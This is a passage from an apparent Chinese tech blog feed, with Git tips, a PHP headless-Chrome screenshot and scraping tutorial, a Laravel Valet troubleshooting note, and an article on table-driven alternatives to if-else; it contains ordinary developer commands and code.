Objects)"></a>杂项(Miscellaneous Objects)</h2><h3 id="克隆所有子模块"><a href="#克隆所有子模块" class="headerlink" title="克隆所有子模块"></a>克隆所有子模块</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> --recursive git://github.com/foo/bar.git</span><br></pre></td></tr></table></figure><p>如果已经克隆了:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git submodule update --init --recursive</span><br></pre></td></tr></table></figure><h3 id="删除标签-tag"><a href="#删除标签-tag" class="headerlink" title="删除标签(tag)"></a>删除标签(tag)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git tag -d &lt;tag_name&gt;  </span><br><span class="line">$ git push &lt;remote&gt; :refs/tags/&lt;tag_name&gt;</span><br></pre></td></tr></table></figure><h3 id="恢复已删除标签-tag"><a href="#恢复已删除标签-tag" class="headerlink" title="恢复已删除标签(tag)"></a>恢复已删除标签(tag)</h3><p>如果你想恢复一个已删除标签(tag), 可以按照下面的步骤: 首先, 需要找到无法访问的标签(unreachable tag):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git fsck --unreachable | grep tag</span><br></pre></td></tr></table></figure><p>记下这个标签(tag)的hash，然后用Git的 update-ref</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git update-ref refs/tags/&lt;tag_name&gt; &lt;<span class="built_in">hash</span>&gt;</span><br></pre></td></tr></table></figure><p>这时你的标签(tag)应该已经恢复了。</p><h3 id="已删除补丁-patch"><a href="#已删除补丁-patch" class="headerlink" title="已删除补丁(patch)"></a>已删除补丁(patch)</h3><p>如果某人在 GitHub 上给你发了一个<code>pull request</code>, 但是然后他删除了他自己的原始 fork, 你将没法克隆他们的提交(commit)或使用 <code>git am</code>。在这种情况下, 最好手动的查看他们的提交(commit)，并把它们拷贝到一个本地新分支，然后做提交。</p><p>做完提交后, 再修改作者，参见变更作者。然后, 应用变化, 再发起一个新的<code>pull request</code>。</p><h2 id="跟踪文件-Tracking-Files"><a href="#跟踪文件-Tracking-Files" class="headerlink" title="跟踪文件(Tracking Files)"></a>跟踪文件(Tracking Files)</h2><h3 id="我只想改变一个文件名字的大小写，而不修改内容"><a href="#我只想改变一个文件名字的大小写，而不修改内容" class="headerlink" title="我只想改变一个文件名字的大小写，而不修改内容"></a>我只想改变一个文件名字的大小写，而不修改内容</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(main)$ git mv --force myfile MyFile</span><br></pre></td></tr></table></figure><h3 id="我想从Git删除一个文件，但保留该文件"><a href="#我想从Git删除一个文件，但保留该文件" class="headerlink" title="我想从Git删除一个文件，但保留该文件"></a>我想从Git删除一个文件，但保留该文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(main)$ git rm --cached log.txt</span><br></pre></td></tr></table></figure><h2 id="配置-Configuration"><a href="#配置-Configuration" class="headerlink" title="配置(Configuration)"></a>配置(Configuration)</h2><h3 id="我想给一些Git命令添加别名-alias"><a href="#我想给一些Git命令添加别名-alias" class="headerlink" title="我想给一些Git命令添加别名(alias)"></a>我想给一些Git命令添加别名(alias)</h3><p>在 OS X 和 Linux 下, 你的 Git的配置文件储存在 <code>~/.gitconfig</code>。我在<code>[alias]</code> 部分添加了一些快捷别名(和一些我容易拼写错误的)，如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[<span class="built_in">alias</span>]  </span><br><span class="line">    a = add  </span><br><span class="line">    amend = commit --amend  </span><br><span class="line">    c = commit  </span><br><span class="line">    ca = commit --amend  </span><br><span class="line">    ci = commit -a  </span><br><span class="line">    co = checkout  </span><br><span class="line">    d = diff  </span><br><span class="line">    dc = diff --changed  </span><br><span class="line">    ds = diff --staged  </span><br><span class="line">    f = fetch  </span><br><span class="line">    loll = <span class="built_in">log</span> --graph --decorate --pretty=oneline --abbrev-commit  </span><br><span class="line">    logs = <span class="built_in">log</span> --color --graph --pretty=format:<span class="string">'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset'</span> --abbrev-commit</span><br><span class="line">    m = merge  </span><br><span class="line">    one = <span class="built_in">log</span> --pretty=oneline  </span><br><span class="line">    outstanding = rebase -i @&#123;u&#125;  </span><br><span class="line">    s = status  </span><br><span class="line">    unpushed = <span class="built_in">log</span> @&#123;u&#125;  </span><br><span class="line">    wc = whatchanged  </span><br><span class="line">    wip = rebase -i @&#123;u&#125;  </span><br><span class="line">    zap = fetch -p</span><br></pre></td></tr></table></figure><h3 id="我想缓存一个仓库-repository-的用户名和密码"><a href="#我想缓存一个仓库-repository-的用户名和密码" class="headerlink" title="我想缓存一个仓库(repository)的用户名和密码"></a>我想缓存一个仓库(repository)的用户名和密码</h3><p>你可能有一个仓库需要授权，这时你可以缓存用户名和密码，而不用每次推/拉(push/pull)的时候都输入，Credential helper能帮你。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global credential.helper cache  </span><br><span class="line"><span class="comment"># Set git to use the credential memory cache  </span></span><br><span class="line">$ git config --global credential.helper <span class="string">'cache --timeout=3600'</span>  </span><br><span class="line"><span class="comment"># Set the cache to timeout after 1 hour (setting is in seconds)</span></span><br></pre></td></tr></table></figure><h3 id="我不知道我做错了些什么"><a href="#我不知道我做错了些什么" class="headerlink" title="我不知道我做错了些什么"></a>我不知道我做错了些什么</h3><p>你把事情搞砸了：你 <code>重置(reset)</code> 了一些东西, 或者你合并了错误的分支, 亦或你强推了后找不到你自己的提交(commit)了。有些时候, 你一直都做得很好, 但你想回到以前的某个状态。</p><p>这就是 <code>git reflog</code> 的目的， <code>reflog</code> 记录对分支顶端(the tip of a branch)的任何改变, 即使那个顶端没有被任何分支或标签引用。基本上, 每次HEAD的改变, 一条新的记录就会增加到<code>reflog</code>。遗憾的是，这只对本地分支起作用，且它只跟踪动作 (例如，不会跟踪一个没有被记录的文件的任何改变)。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(main)$ git reflog  </span><br><span class="line">0a2e358 HEAD@&#123;0&#125;: reset: moving to HEAD~2  </span><br><span class="line">0254ea7 HEAD@&#123;1&#125;: checkout: moving from 2.2 to main  </span><br><span class="line">c10f740 HEAD@&#123;2&#125;: checkout: moving from main to 2.2</span><br></pre></td></tr></table></figure><p>上面的reflog展示了从main分支签出(checkout)到2.2 分支，然后再签回。那里，还有一个硬重置(hard reset)到一个较旧的提交。最新的动作出现在最上面以 <code>HEAD@{0}</code>标识.</p><p>如果事实证明你不小心回移(move back)了提交(commit), reflog 会包含你不小心回移前main上指向的提交(0254ea7)。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git reset --hard 0254ea7</span><br></pre></td></tr></table></figure><p>然后使用<code>git reset</code>就可以把main改回到之前的commit，这提供了一个在历史被意外更改情况下的安全网。</p>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP 使用Headless Chrome 抓取网页</title>
      <link href="/php-uses-headless-chrome-to-scrape-web-pages/"/>
      <url>/php-uses-headless-chrome-to-scrape-web-pages/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP-使用-Headless-Chrome-抓取网页"><a href="#PHP-使用-Headless-Chrome-抓取网页" class="headerlink" title="PHP 使用 Headless Chrome 抓取网页"></a>PHP 使用 Headless Chrome 抓取网页</h1><p>通常使用 PHP 抓取网页数据时，最常见的两种方式就是 <code>CURL</code> 和 <code>file_get_contents</code>。这样确实可以抓取到数据，但是无法等待等待页面上的 <code>JS</code> 加载完成之后才进行数据抓取。</p><p>于是便有了使用 <a href="http://phantomjs.org/" target="_blank" rel="noopener">PhantomJS</a>，<a href="https://github.com/laurentj/slimerjs" target="_blank" rel="noopener">SlimerJS</a> 这类解决方案。</p><p>今天要介绍的并不是上面两位，而是 Headless Chrome。</p><a id="more"></a><h2 id="什么是-Headless-Chrome"><a href="#什么是-Headless-Chrome" class="headerlink" title="什么是 Headless Chrome"></a>什么是 Headless Chrome</h2><p>Headless Chrome 是 Chrome 浏览器的无界面形态，可以在不打开浏览器的前提下，使用所有 Chrome 支持的特性运行你的程序。<br>相比于现代浏览器，Headless Chrome 更加方便测试 Web 应用，获得网站的截图，做爬虫抓取信息等。</p><h2 id="如何获取-Headless-Chrome"><a href="#如何获取-Headless-Chrome" class="headerlink" title="如何获取 Headless Chrome"></a>如何获取 Headless Chrome</h2><p>在 Mac 上，Chrome 59 以后的版本均搭载了 Headless Chrome，所以只要保证 Google Chrome 版本不要低于 59 即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --version</span><br><span class="line"></span><br><span class="line">Google Chrome 99.0.4844.51</span><br></pre></td></tr></table></figure><p>或者直接在 Chrome 中输入：<code>chrome://version</code>，进行查看。</p><hr><p>Windows 用户找一下 Chrome 的安装路径，通常是：<code>C:\Program Files (x86)\Google\Chrome\Application\chrome</code></p><p>Linxu 服务器则使用 <code>google-chrome</code>（需要提前安装）</p><h3 id="CentOS-安装-Google-Chrome"><a href="#CentOS-安装-Google-Chrome" class="headerlink" title="CentOS 安装 Google Chrome"></a>CentOS 安装 Google Chrome</h3><ol><li><p>下载 Chrome 最新的rpm</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://dl.google.com/linux/direct/google-chrome-stable_current_x86_64.rpm</span><br></pre></td></tr></table></figure></li><li><p>安装 Chrome</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install .&#x2F;google-chrome-stable_current_*.rpm</span><br></pre></td></tr></table></figure></li><li><p>查看当前版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">google-chrome -version</span><br></pre></td></tr></table></figure></li></ol><h2 id="如何在终端中使用"><a href="#如何在终端中使用" class="headerlink" title="如何在终端中使用"></a>如何在终端中使用</h2><p>Mac 用户在终端使用之前，建议先绑定别名，使用起来更方便：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alias google-chrome&#x3D;&quot;&#x2F;Applications&#x2F;Google\ Chrome.app&#x2F;Contents&#x2F;MacOS&#x2F;Google\ Chrome&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">google-chrome --headless --disable-gpu --remote-debugging-port&#x3D;9222 https:&#x2F;&#x2F;www.github.com</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>--headless</code>：使用 headless 模式运行 Chrome</li><li><code>--disable-gpu</code>：屏蔽现阶段可能触发的错误</li><li><code>--remote-debug-port=9222</code>：DevTools 远程调试Chrome</li><li><code>https://www.github.com</code>：目标地址</li></ul><h3 id="保存为截图"><a href="#保存为截图" class="headerlink" title="保存为截图"></a>保存为截图</h3><p><code>--screenshot</code> 参数可以将页面内容保存为截图：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">google-chrome --headless --<span class="built_in">disable</span>-gpu --screenshot --window-size=1280,1696 https://github.com</span><br></pre></td></tr></table></figure><h3 id="保存为PDF"><a href="#保存为PDF" class="headerlink" title="保存为PDF"></a>保存为PDF</h3><p><code>--print-to-pdf</code> 参数可以将页面内容保存为PDF：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">google-chrome --headless --<span class="built_in">disable</span>-gpu --<span class="built_in">print</span>-to-pdf https://github.com</span><br></pre></td></tr></table></figure><h3 id="打印DOM"><a href="#打印DOM" class="headerlink" title="打印DOM"></a>打印DOM</h3><p><code>--dump-dom</code> 参数将 <code>document.body.innerHTML</code> 输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">google-chrome --headless --<span class="built_in">disable</span>-gpu --dump-dom https://github.com</span><br></pre></td></tr></table></figure><h2 id="在-PHP-中使用-Headless-Chrome"><a href="#在-PHP-中使用-Headless-Chrome" class="headerlink" title="在 PHP 中使用 Headless Chrome"></a>在 PHP 中使用 Headless Chrome</h2><p><a href="https://github.com/chrome-php/chrome" target="_blank" rel="noopener">Chrome PHP</a> 是一个可以在 headless 模式下使用 <code>Chrome/Chromium</code> 的类库。</p><p>安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require chrome-php/chrome</span><br></pre></td></tr></table></figure><p>使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">HeadlessChromium</span>\<span class="title">BrowserFactory</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// chrome/chromium 安装位置</span></span><br><span class="line">    $browserFactory = <span class="keyword">new</span> BrowserFactory(<span class="string">'/Applications/Google Chrome.app/Contents/MacOS/Google Chrome'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// starts headless chrome</span></span><br><span class="line">    $browser = $browserFactory-&gt;createBrowser();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// cr3eates a new page and navigate to an url</span></span><br><span class="line">    $page = $browser-&gt;createPage();</span><br><span class="line">    $page-&gt;navigate(<span class="string">"https://github.com"</span>)-&gt;waitForNavigation();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取浏览器滚动条宽高，用于设置：setViewport</span></span><br><span class="line">    $evaluation = $page-&gt;callFunction(</span><br><span class="line">        <span class="string">'function() &#123;</span></span><br><span class="line"><span class="string">            var width = document.body.scrollWidth;</span></span><br><span class="line"><span class="string">            var height = document.body.scrollHeight;</span></span><br><span class="line"><span class="string">            return [width,height];</span></span><br><span class="line"><span class="string">         &#125;'</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    $value  = $evaluation-&gt;getReturnValue();</span><br><span class="line">    $width  = $value[<span class="number">0</span>];</span><br><span class="line">    $height = $value[<span class="number">1</span>];</span><br><span class="line">    $page-&gt;setViewport($width, $height)-&gt;await(); <span class="comment">// wait for operation to complete</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// take the screenshot (in memory binaries)</span></span><br><span class="line">    $screenshot = $page-&gt;screenshot([</span><br><span class="line">        <span class="string">'format'</span>  =&gt; <span class="string">'jpeg'</span>, <span class="comment">// default to 'png' - possible values: 'png', 'jpeg',</span></span><br><span class="line">        <span class="string">'quality'</span> =&gt; <span class="number">100</span>, <span class="comment">// only if format is 'jpeg' - default 100</span></span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 保存图片</span></span><br><span class="line">    $screenshot-&gt;saveToFile(<span class="string">"github.png"</span>);</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="comment">// 关闭浏览器</span></span><br><span class="line">    $browser-&gt;close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://github.com/chrome-php/chrome" target="_blank" rel="noopener">Chrome-PHP</a></li><li><a href="https://www.chromium.org/" target="_blank" rel="noopener">Chromium Project</a></li><li><a href="https://zhuanlan.zhihu.com/p/27100187" target="_blank" rel="noopener">初探 Headless Chrome</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel Valet 使用问题整理</title>
      <link href="/laravel-valet-uses-problem-sorting/"/>
      <url>/laravel-valet-uses-problem-sorting/</url>
      
        <content type="html"><![CDATA[<p><a href="https://laravel.com/docs/9.x/valet" target="_blank" rel="noopener">Valet</a> 是 Mac 极简主义者的 Laravel 开发环境。</p><a id="more"></a><h2 id="问题一"><a href="#问题一" class="headerlink" title="问题一"></a>问题一</h2><p><code>brew services stop php</code>和 <code>valet stop</code> 全部停止之后：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220227111807.png" alt=""></p><p>访问站点：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220227111905.png" alt=""></p><p><code>brew services stop php</code> 之后，启用 <code>valet start</code> ：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220227111929.png" alt=""></p><p>站点还是访问不了，一直显示 502，同时<code>~/.config/valet/Log/nginx-error.log</code> 会输出以下日志：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2022&#x2F;02&#x2F;22 20:32:00 [crit] 36873#0: *1 connect() to unix:&#x2F;Users&#x2F;boo&#x2F;.config&#x2F;valet&#x2F;valet.sock failed (13: Permission denied) while connecting to upstream, client: 127.0.0.1, server: , request: &quot;GET &#x2F; HTTP&#x2F;1.1&quot;, upstream: &quot;fastcgi:&#x2F;&#x2F;unix:&#x2F;Users&#x2F;boo&#x2F;.config&#x2F;valet&#x2F;valet.sock:&quot;, host: &quot;localhost&quot;</span><br></pre></td></tr></table></figure><p>查了一下，看到了<a href="https://github.com/laravel/valet/issues/269#issuecomment-446464150" target="_blank" rel="noopener">这个答案</a>，最后尝试以下命令，解决：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">composer global update</span><br><span class="line">valet install</span><br><span class="line">valet restart</span><br></pre></td></tr></table></figure><h2 id="问题二"><a href="#问题二" class="headerlink" title="问题二"></a>问题二</h2><p>再次访问默认站点，即可看到正常输出页面：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220227111958.png" alt=""></p><p>但是当我访问同目录下的其他非默认站点时（valet 的顶级域名，比如 phpinfo.test），又会出现 502，这是为什么呢？<br>而且这一次还没有看到任何<code>error.log</code> 输出。</p><p>那这个就和<code>Nginx</code> 或者 <code>PHP-FPM</code> 没有什么关系了。</p><p>这是因为本地的Clash 设置了系统代理，所有请求都是通过 <code>127.0.0.1:7890</code> 转发出去的。</p><p>具体可以看一下下面两个Issue：</p><ol><li><a href="https://github.com/Dreamacro/clash/issues/423" target="_blank" rel="noopener">打开clashx之后，mac系统配置的hosts就会失效</a></li><li><a href="https://github.com/Fndroid/clash_for_windows_pkg/issues/1175" target="_blank" rel="noopener">开启系统代理某些情况下会导致无法正常连接</a></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>启用 Valet 的话，就不用再手动使用<code>brew</code> 启用PHP 或者 Nginx 了，否则端口会冲突</li><li>本地启用系统代理的情况下，访问Valet 下的顶级域名站点，通常会失败</li></ol><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>Valet 常用命令</p><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>valet forget</td><td>从一个『驻留』目录运行此命令，从驻留目录列表将其它移除</td></tr><tr><td>valet log</td><td>从 Valet 的服务中查看日志</td></tr><tr><td>valet paths</td><td>查看所有『驻留』路径</td></tr><tr><td>valet restart</td><td>重启 Valet 守护进程</td></tr><tr><td>valet start</td><td>开启 Valet 守护进程</td></tr><tr><td>valet stop</td><td>停止 Valet 守护进程</td></tr><tr><td>valet trust</td><td>为 Brew 和 Valet 添加文件修改权限使 Valet 输入命令的时候不需要输入密码</td></tr><tr><td>valet uninstall</td><td>完成卸载 Valet 守护进程</td></tr><tr><td>valet use <a href="mailto:php@7.2">php@7.2</a></td><td>切换PHP 版本</td></tr><tr><td>valet tld app</td><td>切换顶级域名</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Laravel </category>
          
          <category> Mac </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Mac </tag>
            
            <tag> Laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何避免写出 If-Else</title>
      <link href="/how-to-avoid-writing-out-if-else/"/>
      <url>/how-to-avoid-writing-out-if-else/</url>
      
        <content type="html"><![CDATA[<p>本文并不肯定或者否定哪一种写法，仅仅为大家提供一些其他的编码思路或者一些值得借鉴的点子。</p><a id="more"></a><h2 id="为什么要避免使用if-else"><a href="#为什么要避免使用if-else" class="headerlink" title="为什么要避免使用if-else"></a>为什么要避免使用if-else</h2><p><code>if-else</code> 通常是一个糟糕的选择，它导致设计复杂，代码可读性差，并且可能导致重构困难。</p><p>这里以<strong>表驱动法</strong>为例，来介绍一下为什么要避免使用<code>if-else</code>。</p><p><strong>表驱动法</strong>的意义在于逻辑和数据分离，在程序中，添加数据和添加逻辑的方式、成本是不一样的，简单来说：</p><ul><li>添加数据非常简单，属于<strong>低成本</strong>、<strong>低风险</strong></li><li>而添加逻辑是复杂的，属于<strong>高成本</strong>、<strong>高风险</strong></li></ul><p>下面是一段用表驱动法重构之前的<code>if-else</code>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">contry_initial</span><span class="params">($country)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($country===<span class="string">"China"</span> )&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="string">"CHN"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>($country===<span class="string">"America"</span>)&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="string">"USA"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>($country===<span class="string">"Japna"</span>)&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"JPN"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="string">"OTHER"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在如果需要增加一个国家，继续使用<code>if-else</code> 写的话，就等同于增加一个逻辑。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">contry_initial</span><span class="params">($country)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($country===<span class="string">"China"</span> )&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="string">"CHN"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ($country===<span class="string">"Korea"</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"KR"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果改成表驱动法就是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">contry_initial</span><span class="params">($country)</span></span>&#123;</span><br><span class="line">  $countryList=[</span><br><span class="line">      <span class="string">"China"</span>=&gt; <span class="string">"CHN"</span>,</span><br><span class="line">      <span class="string">"America"</span>=&gt; <span class="string">"USA"</span>,</span><br><span class="line">      <span class="string">"Japna"</span>=&gt; <span class="string">"JPN"</span>,</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(array_key_exists($country, $countryList)) &#123;</span><br><span class="line">       <span class="keyword">return</span> $countryList[$country];</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="string">"Other"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>改写成表驱动法之后，如果需要增加一个国家，就只需要在数组里面加个数据，此时就分离了数据与逻辑的关系了。</p><p>重构到此结束，这样做的好处有哪些呢？</p><h3 id="代码本身的优势"><a href="#代码本身的优势" class="headerlink" title="代码本身的优势"></a>代码本身的优势</h3><ul><li>逻辑和数据分离，两者一目了然</li><li>关系表可以更换，比如国家表格可以是多语言的，中文版表格，英文版表格等，日语版表格，以及单元测试中，可以注入测试表格。</li><li>在单元测试中，逻辑必须测试，而数据无需测试。可以想象如果没有表格法，弄个多语言，要写多少语句。</li></ul><h3 id="数据来源的灵活性"><a href="#数据来源的灵活性" class="headerlink" title="数据来源的灵活性"></a>数据来源的灵活性</h3><p>国家表格的数据可以来源以下渠道：</p><ul><li>来自代码</li><li>来自配置</li><li>来自数据库</li><li>来自第三方 API</li><li>…</li></ul><h3 id="数据输入修改的成本与风险"><a href="#数据输入修改的成本与风险" class="headerlink" title="数据输入修改的成本与风险"></a>数据输入修改的成本与风险</h3><p>我们想想，聘用一个不懂编程，但培训一下就会用后台的客服便宜，还是会一个懂系统开发人员便宜？</p><p>如果这个是数据，是来自于数据库的，那么基本上公司的任何有权限的人在后台把这个映射表填一下，就能正常工作了。这个耗费与风险几乎可以忽略不计。 如果数据来自第三方 API，如果第三方添加修改了数据，你也是基本放心的。</p><p>但是如果这个是逻辑本身，那么只能是这个系统开发人员进行修改，构建，然后经过一系列的测试，进行专业部署流程，使得这个功能在产品上运行，是个耗费与风险是不言而喻的。另外考虑到多人开发，开发风格不统一的话，那么代码审查就不可避免了。</p><h3 id="数据格式的强制性和代码风格的随意性"><a href="#数据格式的强制性和代码风格的随意性" class="headerlink" title="数据格式的强制性和代码风格的随意性"></a>数据格式的强制性和代码风格的随意性</h3><p>在现实中，多人开发同一个功能是很常见的，这里就会有一个多人代码风格统一的问题。</p><p>而对于数据来说，一旦数据的格式被确认之后，数据格式就是强制性的了。</p><p>比如在上面的例子中，无论是谁，加几个美国的数据也只能这样加：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$countryList=[</span><br><span class="line">     <span class="string">"China"</span>=&gt; <span class="string">"CHN"</span>,</span><br><span class="line">     <span class="string">"America"</span>=&gt; <span class="string">"USA"</span>,</span><br><span class="line">     <span class="string">"Japan"</span>=&gt; <span class="string">"JPN"</span>,</span><br><span class="line">     <span class="string">"US"</span>=&gt; <span class="string">"USA"</span>,</span><br><span class="line">     <span class="string">"United States of America"</span>=&gt; 